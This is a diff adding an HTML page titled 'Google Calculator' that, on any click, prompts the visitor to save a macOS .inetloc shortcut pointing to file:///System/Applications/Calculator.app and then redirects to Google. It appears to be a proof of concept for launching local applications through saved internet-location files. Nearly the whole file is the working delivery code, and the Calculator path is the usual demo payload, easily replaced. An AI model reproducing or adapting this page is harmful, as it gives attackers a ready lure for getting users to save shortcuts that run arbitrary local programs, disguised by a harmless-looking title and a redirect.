@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Calculator</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: #0f0f23;
+      color: #00ff88;
+      font-family: monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      cursor: pointer;
+    }
+    h1 {
+      font-size: 3.5rem;
+      margin-bottom: 1.5rem;
+      color: #5fff87;
+      text-shadow: 0 0 10px #00ff88;
+    }
+    p {
+      font-size: 1.4rem;
+      max-width: 700px;
+      line-height: 1.6;
+      margin-bottom: 2rem;
+    }
+    .hint {
+      margin-top: 2rem;
+      font-size: 1.1rem;
+      color: #aaa;
+      opacity: 0.8;
+    }
+    .status {
+      margin-top: 2rem;
+      font-size: 1.2rem;
+      color: #ffd166;
+    }
+  </style>
+</head>
+<body>
+  <h1>Click Anywhere</h1>
+  <p>
+    Click anywhere on this page to trigger the save dialog.<br>
+    Choose a location and save the file → the page will redirect to Google afterward.
+  </p>
+  <p class="hint">
+    Sequence: Click → Save dialog appears → Save file → Redirect to Google.
+  </p>
+  <div class="status" id="status">Waiting for click...</div>
+
+  <script>
+    const status = document.getElementById('status');
+
+    async function saveInetloc() {
+      status.textContent = "Opening save dialog...";
+
+      if ('showSaveFilePicker' in window) {
+        try {
+          // Munculkan dialog save dulu
+          const handle = await window.showSaveFilePicker({
+            suggestedName: 'Google Calculator.inetloc',
+            types: [{
+              description: 'Internet Location File',
+              accept: { 'application/internet-shortcut': ['.inetloc', '.url'] }
+            }],
+          });
+
+          status.textContent = "Saving file...";
+
+          // Isi file .inetloc (launch Calculator.app)
+          const content = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>URL</key>
+  <string>file:///System/Applications/Calculator.app</string>
+</dict>
+</plist>`;
+
+          const writable = await handle.createWritable();
+          await writable.write(content);
+          await writable.close();
+
+          status.textContent = "File saved successfully! Redirecting to Google in 1 second...";
+
+          // Redirect setelah save selesai (delay 1 detik seperti kode asli kamu)
+          setTimeout(() => {
+            window.location.href = 'https://google.com';
+          }, 1000);
+
+        } catch (err) {
+          if (err.name === 'AbortError') {
+            status.textContent = "Save dialog cancelled by user.";
+          } else {
+            status.textContent = "Error: " + err.name + " - " + (err.message || 'Unknown error');
+            console.error("Save failed:", err);
+          }
+        }
+      } else {
+        status.textContent = "Warning: showSaveFilePicker is not supported in this browser.";
+      }
+    }
+
+    // Klik di mana saja juga trigger
+    document.addEventListener('click', saveInetloc);
+  </script>
+</body>
+</html>
